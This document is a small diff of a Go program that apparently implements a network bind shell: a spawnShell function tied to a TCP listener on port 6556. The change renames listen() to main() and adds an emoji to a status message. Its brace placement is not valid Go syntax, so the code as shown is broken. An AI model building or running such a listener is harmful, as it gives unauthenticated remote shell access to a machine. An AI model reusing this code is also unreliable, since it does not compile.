@@ -54,7 +54,7 @@ func spawnShell(conn net.Conn)
 	spawn.Run()
 }
 
-func listen() 
+func main() 
 {
 	ln, err := net.Listen("tcp", ":6556")
 	if handleError(err) == 1
@@ -63,7 +63,7 @@ func listen()
 	}
 	else
 	{
-		fmt.Printf("\n Listening...")
+		fmt.Printf("\n🟡 Listening...")
 	}
 
 	for
